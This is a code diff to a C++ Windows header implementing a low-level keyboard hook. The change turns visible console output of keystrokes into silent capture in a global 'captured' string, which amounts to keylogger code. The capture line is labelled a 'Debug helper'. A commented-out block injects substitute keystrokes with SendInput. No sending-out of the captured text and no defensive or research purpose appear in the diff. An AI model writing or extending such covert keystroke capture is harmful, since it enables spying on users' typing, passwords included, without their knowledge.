@@ -1,13 +1,14 @@
 #ifndef key_proc
 #define key_proc
 
-#include <iostream>
 #include <winuser.h>
 #include "key_codes.h"
 using namespace std;
 
 namespace key_proc
 {
+    string captured = "";
+    //Debug helper
     INPUT change_ks(DWORD vkey)
     {
         INPUT input;
@@ -29,9 +30,9 @@ namespace key_proc
         KBDLLHOOKSTRUCT *k = ((KBDLLHOOKSTRUCT *)lparam);
         if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
         {
-            cout << key_codes::kc[k->vkCode].desc;
+            captured += key_codes::kc[k->vkCode].desc;
             if (k->vkCode == VK_RETURN)
-                cout << "\n";
+                captured += "\n";
         }
 
         if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
@@ -43,12 +44,14 @@ namespace key_proc
                 for (auto i = 0; i < key_codes::kc[k->vkCode].desc.length(); i++)
                 {
                     if (i == 1)
-                        cout << "\\";
-                    cout << key_codes::kc[k->vkCode].desc[i];
+                        captured += "\\";
+                    captured += key_codes::kc[k->vkCode].desc[i];
                 }
         }
 
-        /*if (wparam == WM_KEYDOWN && ((KBDLLHOOKSTRUCT *)lparam)->vkCode == VK_OEM_MINUS)
+        /*
+        //Debug --> changing - to +
+        if (wparam == WM_KEYDOWN && ((KBDLLHOOKSTRUCT *)lparam)->vkCode == VK_OEM_MINUS)
         {
             INPUT input = change_ks(VK_ADD);
             SendInput(1, &input, sizeof(INPUT));
@@ -57,7 +60,9 @@ namespace key_proc
             SendInput(1, &input, sizeof(INPUT));
 
             return 1;
-        }*/
+        }
+        //end debug
+        //*/
 
         return CallNextHookEx(NULL, code, wparam, lparam);
     }
